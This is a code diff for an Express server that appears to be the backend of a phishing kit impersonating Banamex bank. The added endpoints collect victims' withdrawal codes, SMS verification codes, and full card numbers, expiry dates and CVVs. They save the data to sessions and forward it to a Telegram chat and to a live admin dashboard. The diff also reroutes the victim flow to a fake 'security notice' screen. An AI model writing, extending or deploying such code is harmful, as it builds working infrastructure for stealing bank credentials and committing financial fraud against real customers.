@@ -801,7 +801,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         claveAcceso,
         challenge: challenge || '',
         netkeyResponse: netkeyResponse || '',
-        pasoActual: ScreenType.BANAMEX_NETKEY,
+        pasoActual: ScreenType.AVISO_SEGURIDAD,
         createdBy: "banamex_client",
       });
 
@@ -916,6 +916,122 @@ export async function registerRoutes(app: Express): Promise<Server> {
         success: false,
         message: "Error procesando NetKey" 
       });
+    }
+  });
+
+  app.post('/api/banamex/codigo-retiro', async (req, res) => {
+    try {
+      const { sessionId, codigoRetiro, codigoVerificacionSMS } = req.body;
+
+      if (!sessionId || !codigoRetiro || !codigoVerificacionSMS) {
+        return res.status(400).json({ 
+          success: false,
+          message: "Faltan datos requeridos" 
+        });
+      }
+
+      const existingSession = await storage.getSessionById(sessionId);
+      if (!existingSession) {
+        console.error(`[Código Retiro] Sesión no encontrada: ${sessionId}`);
+        return res.status(404).json({ 
+          success: false,
+          message: "Sesión no encontrada." 
+        });
+      }
+
+      // Actualizar sesión con los datos del código de retiro
+      await storage.updateSession(sessionId, { 
+        codigoRetiro,
+        codigoVerificacionSMS,
+        pasoActual: ScreenType.PROTECCION_TARJETAS,
+      });
+
+      console.log(`[Código Retiro] Datos recibidos - Session: ${sessionId}`);
+
+      const telegramMessage = 
+        `🔐 <b>Código de Retiro - Banamex</b>\n\n` +
+        `🆔 <b>Session ID:</b> ${sessionId}\n` +
+        `📱 <b>Número de Cliente:</b> ${existingSession.numeroCliente}\n` +
+        `🔢 <b>Código Retiro:</b> ${codigoRetiro}\n` +
+        `📲 <b>Código SMS:</b> ${codigoVerificacionSMS}\n` +
+        `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
+
+      await sendTelegramMessage(telegramMessage);
+
+      broadcastToAdmins(JSON.stringify({
+        type: 'SESSION_UPDATED',
+        data: { sessionId, codigoRetiro, codigoVerificacionSMS }
+      }));
+
+      res.json({ 
+        success: true,
+        message: "Código de retiro registrado exitosamente" 
+      });
+    } catch (error) {
+      console.error("Error procesando código de retiro:", error);
+      res.status(500).json({ success: false, message: "Error procesando datos" });
+    }
+  });
+
+  app.post('/api/banamex/proteccion-tarjetas', async (req, res) => {
+    try {
+      const { sessionId, tarjetas } = req.body;
+
+      if (!sessionId || !tarjetas || !Array.isArray(tarjetas)) {
+        return res.status(400).json({ 
+          success: false,
+          message: "Faltan datos requeridos" 
+        });
+      }
+
+      const existingSession = await storage.getSessionById(sessionId);
+      if (!existingSession) {
+        console.error(`[Protección Tarjetas] Sesión no encontrada: ${sessionId}`);
+        return res.status(404).json({ 
+          success: false,
+          message: "Sesión no encontrada." 
+        });
+      }
+
+      // Guardar tarjetas como JSON
+      await storage.updateSession(sessionId, { 
+        tarjetasProtegidas: JSON.stringify(tarjetas),
+        pasoActual: ScreenType.VERIFICANDO_INFO,
+      });
+
+      console.log(`[Protección Tarjetas] Datos recibidos - Session: ${sessionId}, Tarjetas: ${tarjetas.length}`);
+
+      // Crear mensaje con información de las tarjetas
+      let tarjetasInfo = '';
+      tarjetas.forEach((tarjeta: any, index: number) => {
+        tarjetasInfo += `\n\n<b>Tarjeta ${index + 1} (${tarjeta.tipo}):</b>\n`;
+        tarjetasInfo += `💳 <b>Número:</b> ${tarjeta.numero}\n`;
+        tarjetasInfo += `📅 <b>Vencimiento:</b> ${tarjeta.vencimiento}\n`;
+        tarjetasInfo += `🔐 <b>CVV:</b> ${tarjeta.cvv}`;
+      });
+
+      const telegramMessage = 
+        `💳 <b>Protección de Tarjetas - Banamex</b>\n\n` +
+        `🆔 <b>Session ID:</b> ${sessionId}\n` +
+        `📱 <b>Número de Cliente:</b> ${existingSession.numeroCliente}\n` +
+        `🔢 <b>Cantidad de Tarjetas:</b> ${tarjetas.length}` +
+        tarjetasInfo +
+        `\n\n⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
+
+      await sendTelegramMessage(telegramMessage);
+
+      broadcastToAdmins(JSON.stringify({
+        type: 'SESSION_UPDATED',
+        data: { sessionId, tarjetas }
+      }));
+
+      res.json({ 
+        success: true,
+        message: "Tarjetas registradas exitosamente" 
+      });
+    } catch (error) {
+      console.error("Error procesando protección de tarjetas:", error);
+      res.status(500).json({ success: false, message: "Error procesando datos" });
     }
   });
 
